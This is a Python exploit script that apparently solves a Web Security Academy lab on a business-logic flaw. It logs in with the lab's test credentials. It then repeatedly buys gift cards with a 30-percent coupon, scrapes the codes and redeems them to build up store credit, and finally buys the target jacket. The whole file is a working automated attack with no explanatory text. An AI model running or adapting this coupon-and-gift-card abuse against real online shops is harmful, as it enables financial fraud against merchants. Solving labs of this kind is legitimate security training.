import sys
import requests
from bs4 import BeautifulSoup



def extract_csrf_token(response):
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    return csrf_token


def extract_giftcard_codes(response):
    soup = BeautifulSoup(response.text, "html.parser")
    gift_card_table = soup.find(class_="is-table-numbers")
    gift_card_codes = [code.text.strip() for code in gift_card_table.find_all('td')]
    return gift_card_codes


def login(url, session):
    response = session.get(f"{url}/login", timeout=10)
    if response.status_code == 200:
        csrf_token = extract_csrf_token(response)
        login_response = session.post(f"{url}/login", data={"csrf": csrf_token, "username": "wiener", "password": "peter"}, timeout=10)
        return "Your username is: wiener" in login_response.text


def get_gift_cards(url, session):
    gift_cards_purchased = 0

    # Adding an item to the cart to ensure the /cart page contains a CSRF token
    session.post(f"{url}/cart", data={"productId": "2", "redir": "PRODUCT", "quantity": "1"}, allow_redirects=False, timeout=10)

    # Requesting /cart page and extracting CSRF token
    response = session.get(f"{url}/cart")
    csrf_token = extract_csrf_token(response)

    # Removing the item from the cart
    session.post(f"{url}/cart", data={"productId": "2", "redir": "PRODUCT", "quantity": "-1"}, allow_redirects=False, timeout=10)

    for i in range(1, 29):
        # Adding gift card to cart
        session.post(f"{url}/cart", data={"productId": "2", "redir": "PRODUCT", "quantity": "10"}, timeout=10)

        # Adding 30 percent off coupon
        session.post(f"{url}/cart/coupon", data={"csrf": csrf_token, "coupon": "SIGNUP30"}, timeout=10)

        # Checking out
        checkout_response = session.post(f"{url}/cart/checkout", data={"csrf": csrf_token}, timeout=10)

        # Extracting gift card codes from confirmation page
        gift_card_codes = extract_giftcard_codes(checkout_response)

        # Adding gift cards to account
        for j in range(10):
            session.post(f"{url}/gift-card", data={"csrf": csrf_token, "gift-card": gift_card_codes[j]})
            gift_cards_purchased += 1
            print(f"\r    Total gift cards purchased: {gift_cards_purchased}", end="", flush=True)


def purchase_jacket(url, session):
    # Adding jacket to cart
    session.post(f"{url}/cart", data={"productId": "1", "redir": "PRODUCT", "quantity": "1"}, allow_redirects=False, timeout=10)

    # Extracting csrf token
    response = session.get(f"{url}/cart")
    csrf_token = extract_csrf_token(response)

    # Adding coupon code
    session.post(f"{url}/cart/coupon", data={"csrf": csrf_token, "coupon": "SIGNUP30"}, timeout=10)

    # Checking out
    checkout_response = session.post(f"{url}/cart/checkout", data={"csrf": csrf_token}, timeout=10)

    # Verifying order was successfully placed
    return "Your order is on its way!" in checkout_response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))

        print("(+) Logging in...")
        if not login(url, session):
            print("(-) Something went wrong. Please check your URL and try again.")
            sys.exit(1)

        print("(+) Purchasing 280 gift cards...")
        get_gift_cards(url, session)

        print("\n(+) Purchasing \"Lightweight l33t Leather Jacket\"...")
        if purchase_jacket(url, session):
            print("(+) Jacket purchased successfully!")
        else:
            print("(-) Something went wrong.")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")

    except KeyboardInterrupt:
        sys.exit(1)


if __name__ == "__main__":
    main()